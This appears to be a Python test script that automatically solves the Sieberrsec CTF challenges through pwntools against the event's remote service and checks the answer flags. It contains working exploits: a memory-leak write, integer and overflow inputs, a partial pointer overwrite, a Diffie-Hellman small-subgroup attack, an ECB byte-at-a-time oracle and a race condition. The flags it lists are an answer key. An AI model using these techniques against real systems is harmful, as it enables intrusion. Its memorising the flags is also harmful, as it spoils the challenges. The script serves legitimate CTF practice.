#!/usr/bin/env python3
'''This is a script that I made to test most of the SCTF challenges
that involve a remote docker service. You will need the following
packages to run this script:
    * PyCryptoDome
    * requests
    * pwntools
    * pyte (only rock_farming_simulator)
'''
from pwn import *
from requests import get
from re import findall
from Crypto.Util.number import long_to_bytes, sieve_base
from Crypto.Cipher import AES
context.log_level = 'error'
HOST = 'challs.sieberrsec.tech'
def nc(port):
    def outer(f):
        def wrapped():
            r = remote(HOST, port)
            res = f(r)
            r.close()
            return res
        return wrapped
    return outer

def reattempt(cnt=10):
    def outer(f):
        def wrapped():
            for _ in range(cnt):
                try: return f()
                except Exception as e: pass
            raise RuntimeError('function {} has failed {} times sequentially'.format(f,cnt))
        return wrapped
    return outer

@nc(1470)
def pwn_malloc(r):
    r.recvline() # 'Welcome to Sieberrsec CTF!'
    target_addr = int(r.recvline()[6:], 16) # 'Leak: [target_addr]'
    r.sendlineafter(b'Length of your message: ', str(target_addr).encode()) # scanf("%lu", &length)
    r.sendafter(b'Enter your message: ', b'\x00') # read(0, buf, length)
    return r.recvline().decode().strip()

@nc(8862)
def pwn_simple(r):
    r.sendline(b"1")
    r.sendline(b"-1000000000")
    return r.recvall().split(b'\n')[-2].decode()

@nc(3476)
def pwn_warmup(r):
    r.sendline(b'\0'*33)
    return r.recvall().split(b'\n')[-2].decode()

@nc(3477)
def turbofastcrypto_1(r):
    r.sendline(b'\0'*33)
    return findall(b'IRS{.*}', r.recvall(timeout=.2).split(b'\n')[-2])[0].decode()

@nc(3477)
def turbofastcrypto_2(r):
    elf = ELF('turbofastcrypto/bin/turbofastcrypto.cpython-38-x86_64-linux-gnu.so')
    diff = elf.sym.print_flag ^ elf.sym.encrypt
    r.sendlineafter(b'> ', b'a'*0x48 + p8(diff))
    r.sendlineafter(b'> ', b'')
    return r.recvall().split(b'\n')[0].strip().decode()

def flag_checker_1():
    from base64 import b64decode
    script = get('http://%s:15231/index.js' % HOST).text
    relevant = next(l for l in script.split('\n') if 'btoa' in l)
    b64 = findall('".*"', relevant)[0].strip('"')
    return b64decode(b64).decode()

#def flag_checker_2():
'''
flag_checker_v2() {
    printf 'IR' # hacky
    wget -Nq challs.sieberrsec.tech:15232/d262c47d6e0d73876be8.module.wasm &&
        wasm-decompile *.wasm |  # wasm-decomp needs regular files, so no <(curl ...)
        grep ' [a-z] != [0-9]' | grep '[0-9]*' -o | # get ascii
        python -c 'while 1: print(chr(int(input())))' 2> /dev/null|
        tr -d \\n | rev && rm d262c47d6e0d73876be8.module.wasm
}
'''
@nc(29079)
def can_you_math_it(r):
    for _ in range(5): r.recvline()
    for _ in range(100):
        r.sendline(str(int(eval(r.recvline()[5:-2]))).encode())
        r.recvline()
        r.recvline()
    return findall(b'IRS{.*}', r.recvall().split(b'\n')[-2])[0].decode()

@nc(1337)
def diffie_key_exchange_1(r):
    for _ in range(6): r.recvline()
    r.sendline(b'0')
    r.recvline()
    return long_to_bytes(int(findall(b'[0-9]+', r.recvline())[0])).decode()

@reattempt()
@nc(1338)
def diffie_key_exchange_2(r):
    from hashlib import md5
    from random import randint
    from collections import defaultdict
    r.recvuntil(b'p: ')
    p = int(r.recvline())
    # find a small factor of p-1 that only occurs once
    for f in sieve_base:
        v = p-1
        cnt = 0
        while v % f == 0:
            v //= f
            cnt += 1
        if cnt == 1: break
    else: raise RuntimeError("Couldn't find factors!")
    # find a good value of 'h', whatever that is
    while (h:= pow(randint(1,p-1),(p-1)//f,p)) == 1: pass
    if h == p-1: raise RuntimeError("h sucks")
    r.recvuntil(b'key?\n')
    r.sendline(str(h).encode())
    r.recvline()
    r.recvuntil(b'flag: ')
    enc = bytes.fromhex(r.recvline().strip().decode())
    # get all possible values of the group
    seen = set()
    for a in range(99):
        key = md5(long_to_bytes(pow(h,a,p))).digest()
        if key in seen: break
        seen.add(key)
    else: raise RuntimeError("Something wrong with h")
    for key in seen:
        cipher = AES.new(key, AES.MODE_ECB)
        res = findall(b'IRS{.*}', cipher.decrypt(enc))
        if res: return res[0].decode()
    raise RuntimeError("Didn't get the flag!")

@nc(31311)
def totallyfoolproofcrypto(r):
    from Crypto.Util.Padding import pad, unpad
    from string import ascii_letters, digits, punctuation
    charset = ascii_letters+digits+punctuation
    
    def enc(pt: bytes) -> str:
        r.sendlineafter(b'> ', pt)
        if b'\n' in pt: raise RuntimeError(pt)
        return bytes.fromhex(r.recvline().decode())
    
    smallestlen = len(enc(b'A'))
    for i in range(2,16):
        if len(enc(b'A'*i)) != smallestlen: break
    # At this point, (i+len(FLAG)) % 16 == 0
    # Note that when ls = blockify(enc(pad(b'}', 16) + b'A'*(i+1))), ls[0] == ls[-1].
    
    flag = ''
    flag = 'pr0bl3m}'
    flag = 't_an_0rig1nal_pr0bl3m}'
    def try_out(guess):
        padded = pad(guess.encode(), AES.block_size)
        pt = padded[:16]+b'A'*(i+len(guess))
        ls = group(16,enc(pt))
        return ls[0] in ls[1:]
    while '{' not in flag:
        #print(flag)
        if b'\n' in pad(b'.'+flag.encode(), AES.block_size): #uh-oh
            for c1 in charset:
                for c2 in charset:
                    if try_out(guess:=c1+c2+flag): break
                else: continue
                break
            else:
                print("PANIC: CHARACTERS NOT FOUND")
                exit(1)
        else:
            for c in charset:
                if try_out(guess:=c+flag): break
            else:
                print("PANIC: CHARACTER NOT FOUND")
                exit(1)
        flag = guess
    return "IRS"+flag

@reattempt()
def rock_farming_simulator():
    import pyte # fun module to handle PTYs
    from re import findall
    # set up screen
    screen = pyte.Screen(100,30)
    stream = pyte.ByteStream(screen)
    r = process(['ssh', '-p15233', 'rock_farming_simulator@%s'%HOST], env={'TERM': 'linux', 'COLUMNS': '100', 'LINES': '30'}, stdin=PTY)
    def send_raw(b,t=0.12):
        r.send_raw(b)
        stream.feed(r.recvrepeat(timeout=t))
    def wallet() -> int: return int(findall('\d+', screen.display[1])[0])
    def parse(l):
        income,cost = map(int,findall('\d+',l))
        return cost,l.split()[0][0], income
    # get the cost of the ponies
    send_raw(b'B')
    pones = [parse(findall("- .*\.", l)[0][2:]) for l in screen.display[5:10]]
    pones.sort()
    required_money = pones[-1][0]
    send_raw(b'\n\n',0.6)
    # get enough money to buy the most expensive pony
    while wallet() < required_money: send_raw(b'T\n', 1.2)
    # attempt to race condition
    send_raw(b'B' + pones[-1][1].encode() + b'\n', 0.55)
    if wallet() < required_money: raise RuntimeError('50% chance of winning')
    send_raw(b'B' + pones[-2][1].encode() + b'\n', 1)
    send_raw(b'H', 2)
    return findall('IRS{.*}', screen.display[5])[0]

def test(chal,flag: str):
    assert chal() == flag
    print("got %s" % flag)

test(pwn_simple, 'IRS{W377_D0NE_40U_G3N1u5_WBVAVEF}')
test(pwn_malloc, 'IRS{Y0U_4R3_4W350M3_CJAVFSHA}')
test(pwn_warmup, 'IRS{nU1L_t3rminat0r}')
test(turbofastcrypto_1, 'IRS{secrets_are_revealed!!}')
test(turbofastcrypto_2, 'IRS{w@s_th@t_fun?}')
test(flag_checker_1, 'IRS{insp3ct_e1ement}')
#test(flag_checker_2, 'IRS{if_only_it_was_all_this_simple}')
test(diffie_key_exchange_1, 'IRS{d1ff1e_h311m4n!!!}')
test(diffie_key_exchange_2, 'IRS{5m411_5ubgr0up_4tt4cc}')
print("This one will take a bit.")
test(can_you_math_it, 'IRS{4f2cd85d0a9f32f4}')
print("This one will take rather long.")
test(totallyfoolproofcrypto, 'IRS{w0w_wh@t_an_0rig1nal_pr0bl3m}')
print("This test will take REALLY REALLY long.")
test(rock_farming_simulator, "IRS{so_long_space_pony}")
